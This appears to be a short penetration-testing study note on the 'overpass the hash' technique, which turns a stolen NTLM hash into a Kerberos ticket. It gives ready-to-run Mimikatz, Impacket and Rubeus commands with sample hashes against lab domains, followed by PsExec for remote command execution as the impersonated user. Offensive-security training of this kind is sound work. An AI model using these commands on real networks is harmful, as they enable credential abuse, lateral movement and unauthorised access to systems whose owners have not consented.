
With *overpass the hash*, we can "over" abuse an NTLM user hash to
gain a full Kerberos Ticket Granting Ticket (TGT). Then we can use
the TGT to obtain a Ticket Granting Service (TGS).

The idea is to turn the NTLM hash into a Kerberos ticket and avoid
the use of NTLM authentication. A simple way to do this is with
the *sekurlsa::pth* command from Mimikatz.

```bash
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372419bf6e93364cc93075 /run:powershell
```

At this point, we have a new PowerShell session that allows us to
execute commands as jen. We can then access various services and
have Kerberos generate for us a TGT and a TGS, thus converting an
NTLM hash into a Kerberos TGT. We can then use this ticket into
various tools, such as the official PsExec application from
microsoft, which does not accept password hashes.
Mainly when pass the hash is not available

# From linux
```bash
impacket-getTGT jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
impacket-psexec jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```

-----------------------

# Rubeus
```bash
.\Rubeus.exe asktgt /domain:oscp.exam /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\ms02.oscp.exam cmd
```

-----------------------
